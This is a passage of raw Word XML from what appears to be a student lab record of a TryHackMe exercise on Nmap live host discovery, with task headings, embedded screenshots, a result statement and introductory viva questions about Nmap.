          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="03D8470D" wp14:editId="1B2A7D7D">
            <wp:extent cx="4115565" cy="431849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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4115565" cy="4318490"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D46FB8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BCECE39" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Task 2: Subnetworks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17CA1529" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="481CEDFD" wp14:editId="18E2EAFD">
            <wp:extent cx="5767492" cy="3515061"/>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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5767492" cy="3515061"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E9A7F11" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="545DAAD9" wp14:editId="287036DA">
            <wp:extent cx="5731510" cy="3198982"/>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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="3198982"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4809795B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E816B28" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Task 3: Enumerating Targets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35F8A1DE" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="73F511DF" wp14:editId="0BF2B4F2">
            <wp:extent cx="5731510" cy="3186288"/>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39"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="3186288"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E668E4D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Task 4: Discovering Live Hosts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6DF2D7" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="07E4FB0F" wp14:editId="12D3424E">
            <wp:extent cx="5731391" cy="3512820"/>
            <wp:effectExtent l="0" t="0" r="317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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5738738" cy="3517323"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="180A1E44" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FBD5D93" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D4E35D9" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B72679">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:noProof/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="258F8D52" wp14:editId="0F2D3C0A">
            <wp:extent cx="4084674" cy="1120237"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>
            <wp:docPr id="115475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750657" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId41"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4084674" cy="1120237"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BDF4BA1" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B72679">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:noProof/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2B3D5701" wp14:editId="6B3F9521">
            <wp:extent cx="4122777" cy="2591025"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="20642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2884" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId42"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4122777" cy="2591025"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9640B0" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50960E4A" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01179395" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="178CBD88" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="482CE695" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D329E29" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C11010A" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CE6098A" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DFC8EFF" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35976C30" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D060772" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20E02D0A" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="726BF8C9" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="729C7574" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="426F92B6" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6582D980" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D315504" w14:textId="77777777" w:rsidR="00B72679" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5737C95B" w14:textId="67DEE62E" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Task 5: Nmap Host Discovery Using ARP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="123479CF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2A944A70" wp14:editId="15F8770B">
            <wp:extent cx="5731509" cy="1536019"/>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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="1536019"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0231B433" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Task 7: Nmap Host Discovery Using TCP and UDP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47DAAC45" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="77FB97FE" wp14:editId="0A02D18E">
            <wp:extent cx="5731510" cy="1637574"/>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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="1637574"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0F9F33" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Task 8: Using Reverse-DNS Lookup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="115B20A0" w14:textId="4F47902D" w:rsidR="0094061E" w:rsidRDefault="00B72679" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00B72679">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Times New Roman" w:hAnsi="Calibri" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0772EF62" wp14:editId="5F563EB1">
            <wp:extent cx="5731509" cy="1802601"/>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5"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="1802601"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFF5D55" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="32AC8376" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Summary:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3C09D4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="16E328B8" wp14:editId="239DDDD5">
            <wp:extent cx="5731509" cy="5268164"/>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46"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="5268164"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D51DA30" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="282C4AEA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Thus Nmap was used to discover live hosts using ARP scan, ICMP scan, and TCP/UDP ping scan in TryHackMe platform.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4642C6ED" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5850C338" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AD65CB9" w14:textId="23CF071E" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Viva Questions </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CAFEAE4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is Nmap?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D303D1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Nmap (Network Mapper) is an open-source tool used for network discovery, host identification, and security auditing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314664B5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. What is live host discovery in Nmap?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7492504A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Live host discovery is the process of identifying active devices (hosts) on a network without performing a complete port scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1F0D3D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
